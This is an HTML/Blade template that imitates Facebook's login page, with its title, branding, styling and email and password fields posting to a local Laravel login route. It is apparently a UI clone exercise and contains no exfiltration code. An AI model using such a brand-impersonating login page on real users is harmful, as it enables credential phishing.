<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In or Sign Up</title>
  <style>
    /* General Reset */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Arial', sans-serif;
  background-color: #f0f2f5;
  color: #1c1e21;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  display: flex;
  max-width: 1000px;
  width: 100%;
  margin: 0 auto;
  padding: 20px;
}

/* Left Section */
.left {
  flex: 1;
  padding-right: 20px;
}

.left h1 {
  color: #1877f2;
  font-size: 50px;
  margin-bottom: 20px;
}

.left p {
  font-size: 20px;
  line-height: 1.5;
}

/* Right Section */
.right {
  flex: 1;
  background: #fff;
  padding: 30px;
  border-radius: 8px;
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
  text-align: center;
}

.login-box form {
  display: flex;
  flex-direction: column;
  gap: 15px;
}

input[type="email"], 
input[type="password"] {
  width: 100%;
  padding: 12px;
  border: 1px solid #ccd0d5;
  border-radius: 6px;
  font-size: 16px;
}

.login-btn {
  background-color: #1877f2;
  color: #fff;
  border: none;
  padding: 12px;
  font-size: 16px;
  border-radius: 6px;
  cursor: pointer;
  font-weight: bold;
}

.login-btn:hover {
  background-color: #155dbb;
}

.forgot-password {
  display: block;
  font-size: 14px;
  color: #1877f2;
  text-decoration: none;
}

.forgot-password:hover {
  text-decoration: underline;
}

hr {
  border: none;
  height: 1px;
  background-color: #ddd;
}

.create-account-btn {
  background-color: #42b72a;
  color: #fff;
  border: none;
  padding: 12px;
  font-size: 16px;
  border-radius: 6px;
  cursor: pointer;
  font-weight: bold;
}

.create-account-btn:hover {
  background-color: #36a420;
}

.create-page {
  margin-top: 20px;
  font-size: 14px;
}

.create-page a {
  color: #1877f2;
  text-decoration: none;
  font-weight: bold;
}

.create-page a:hover {
  text-decoration: underline;
}

/* Responsive Design */
@media (max-width: 768px) {
  .container {
    flex-direction: column;
    align-items: center;
    padding: 10px;
  }

  .left {
    text-align: center;
    margin-bottom: 20px;
  }

  .right {
    width: 100%;
    padding: 20px;
  }
}

  </style>
</head>
<body>
  <div class="container">
    <!-- Left Section -->
    <div class="left">
      <h1>facebook</h1>
      <p>Facebook helps you connect and share with the people in your life.</p>
    </div>
    <!-- Right Section -->
    <div class="right">
      <div class="login-box">
        <form method="post" target="{{ route('login') }}">
          @csrf
          <input type="email" name="email" placeholder="Email or Phone" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit" class="login-btn">Log In</button>
          <a href="#" class="forgot-password">Forgotten password?</a>
          <hr>
          <button type="button" class="create-account-btn">Create New Account</button>
        </form>
      </div>
      <p class="create-page">
        <a href="#">Create a Page</a> for a celebrity, brand, or business.
      </p>
    </div>
  </div>
</body>
</html>
